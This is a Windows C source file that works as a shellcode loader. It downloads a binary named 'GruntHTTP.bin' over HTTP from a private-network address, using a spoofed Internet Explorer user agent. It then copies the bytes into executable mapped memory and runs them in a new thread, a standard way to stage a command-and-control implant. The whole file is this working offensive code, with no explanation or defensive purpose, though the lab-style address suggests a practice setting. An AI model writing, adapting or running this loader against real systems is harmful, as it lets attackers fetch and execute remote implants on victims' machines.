#include <windows.h>
#include <stdio.h>
#include <wininet.h>
#include <bcrypt.h>
#include <wincrypt.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "Crypt32.lib")

#define NT_SUCCESS(Status)          (((NTSTATUS)(Status)) >= 0)
#define STATUS_UNSUCCESSFUL         ((NTSTATUS)0xC0000001L)

BOOL FetchPayloadFromURL(PCSTR url, PBYTE* pPayload, DWORD* pPayloadSize) {
    HINTERNET hInternet, hConnect = NULL;
    DWORD bytesRead;
    BOOL bResult = FALSE;

    hInternet = InternetOpenA("Microsoft Internet Explorer", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL) {
        printf("InternetOpenA failed (%d)\n", GetLastError());
        goto cleanup;
    }

    hConnect = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (hConnect == NULL) {
        printf("InternetOpenUrlA failed (%d)\n", GetLastError());
        goto cleanup;
    }

    *pPayload = (PBYTE)malloc(1024);
    if (!InternetReadFile(hConnect, *pPayload, 1024, &bytesRead)) {
        printf("InternetReadFile failed (%d)\n", GetLastError());
        goto cleanup;
    }

    *pPayloadSize = bytesRead;
    bResult = TRUE;

cleanup:
    if (hConnect) InternetCloseHandle(hConnect);
    if (hInternet) InternetCloseHandle(hInternet);
    return bResult;
}

BOOL LocalMapInject(IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PVOID* ppAddress) {
    BOOL        bSTATE = TRUE;
    HANDLE        hFile = NULL;
    PVOID        pMapAddress = NULL;
    hFile = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sPayloadSize, NULL);
    pMapAddress = MapViewOfFile(hFile, FILE_MAP_WRITE | FILE_MAP_EXECUTE, NULL, NULL, sPayloadSize);
    memcpy(pMapAddress, pPayload, sPayloadSize);
_EndOfFunction:
    *ppAddress = pMapAddress;
    if (hFile)
        CloseHandle(hFile);
    return bSTATE;
}

int main() {

    PVOID    pAddress = NULL;
    HANDLE    hThread = NULL;
    PBYTE    pPayload = NULL;
    DWORD    payloadSize = 0;

    if (!FetchPayloadFromURL("http://192.168.56.103:81/GruntHTTP.bin", &pPayload, &payloadSize)) {
        return -1;
    }

    if (!LocalMapInject(pPayload, payloadSize, &pAddress)) {
        return -1;
    }
    hThread = CreateThread(NULL, NULL, pAddress, NULL, NULL, NULL);
    if (hThread != NULL) {
        WaitForSingleObject(hThread, INFINITE);
    }

    free(pPayload);

    return 0;
}
